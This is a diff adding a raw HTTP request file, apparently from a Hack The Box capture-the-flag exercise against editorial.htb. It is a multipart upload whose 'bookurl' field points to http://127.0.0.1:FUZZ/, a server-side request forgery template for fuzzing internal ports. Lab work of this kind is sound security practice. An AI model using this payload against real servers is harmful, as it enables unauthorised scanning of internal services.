@@ -1,0 +1,23 @@
+POST /upload-cover HTTP/1.1
+Host: editorial.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------292065615225685730112360248953
+Content-Length: 362
+Origin: http://editorial.htb
+Connection: keep-alive
+Referer: http://editorial.htb/upload
+Priority: u=1
+
+-----------------------------292065615225685730112360248953
+Content-Disposition: form-data; name="bookurl"
+
+http://127.0.0.1:FUZZ/
+-----------------------------292065615225685730112360248953
+Content-Disposition: form-data; name="bookfile"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------292065615225685730112360248953--
